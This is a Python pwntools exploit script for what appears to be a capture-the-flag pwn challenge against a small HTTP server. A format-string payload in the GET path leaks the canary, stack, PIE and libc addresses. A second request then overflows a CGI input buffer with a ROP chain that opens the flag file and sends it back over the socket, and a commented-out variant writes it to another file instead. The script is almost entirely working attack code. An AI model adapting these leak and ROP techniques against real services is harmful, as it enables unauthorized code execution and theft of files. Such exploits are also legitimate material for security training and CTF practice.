from pwn import *
#host=process("./attachment")
#gdb.attach(host)
#r=remote("127.0.0.1",9999)


ip="node5.buuoj.cn"
port=25577

"""
ip="127.0.0.1"
port=9999

host=process("./attachment")
host.recvuntil(b"already listen at 9999")
"""

r=remote(ip,port)
#pause()
pay0=b"GET /%167$p_%170$p_%171$p_%197$p HTTP/1.1\n"

r.send(pay0)
#8B6E5
r.recvuntil(b"file does not exist:./")
canary=int(r.recvuntil(b"_")[:-1],16)
stack_add=int(r.recvuntil(b"_")[:-1],16)
pie_base=int(r.recvuntil(b"_")[:-1],16)-0x354d
libc_base=int(r.recvuntil(b"</div>")[:-6],16)-0x8B665
print(hex(canary),hex(stack_add),hex(pie_base),hex(libc_base))
r.close()

libc=ELF("./libc.so.6")
libc.address=libc_base
rdi_add=0x2a3e5+libc_base
rsi_add=0x2be51+libc_base
rdxr12_add=0x11f2e7+libc_base
rax2rdi_add=0x5a171+libc_base
flag_add=0x43AB+pie_base
bss_add=0xa800+pie_base
filename_add=0x44A3+pie_base
main_add=0x379E+pie_base
start_add=0x2780+pie_base
syscall_add=0x29db+libc_base
xorr10_add=0x1498f8+libc_base
rcx_add=0x3d1ee+libc_base
ret_add=0x116273+libc_base
sendfile_add=0x2BA3+pie_base
#本地能把flag写到另一个文件里的rop:
"""
flag_add=stack_add-0x260
rop=p64(rdi_add)+p64(flag_add)+p64(rsi_add)+p64(0)+p64(rdxr12_add)+p64(0)+p64(0)+p64(libc.sym["open"])+p64(rdi_add)+p64(5)+p64(rsi_add)+p64(stack_add-0x200)+p64(rdxr12_add)+p64(50)+p64(0)+p64(libc.sym["read"])+p64(rdi_add)+p64(stack_add-0x258)+p64(rsi_add)+p64(65)+p64(rdxr12_add)+p64(0x1ff)+p64(0)+p64(libc.sym["open"])+p64(rdi_add)+p64(6)+p64(rsi_add)+p64(stack_add-0x200)+p64(rdxr12_add)+p64(50)+p64(0)+p64(libc.sym["write"])

r=remote(ip,port)
pay1=b"GET /a.cgi?input="+b"flag\x00\x00\x00\x00FLAG\x00".ljust(72,b"a")+p64(canary)+b'a'*0x18+rop+b" HTTP/1.1\n"
r.send(pay1)
r.close()

pause()
r=remote(ip,port)
#context.log_level='debug'
r.send(b"GET /FLAG HTTP/1.1\n")
r.interactive()
"""

#"""
#本地能用sendfile把flag发回来的rop
flag_add=stack_add-0x260
rop=p64(rdi_add)+p64(flag_add)+p64(rsi_add)+p64(0)+p64(rdxr12_add)+p64(0)+p64(0)+p64(libc.sym["open"])+p64(rdi_add)+p64(5)+p64(rsi_add)+p64(stack_add-0x200)+p64(rdxr12_add)+p64(50)+p64(0)+p64(libc.sym["read"])+p64(rdi_add)+p64(4)+p64(rsi_add)+p64(stack_add-0x200)+p64(rdxr12_add)+p64(50)+p64(0)+p64(rcx_add)+p64(0)+p64(libc.sym["send"])
pay1=b"GET /a.cgi?input="+b"flag\x00".ljust(72,b"a")+p64(canary)+b'a'*0x18+rop+b" HTTP/1.1\n"
r=remote(ip,port)
r.send(pay1)
r.interactive()
#"""





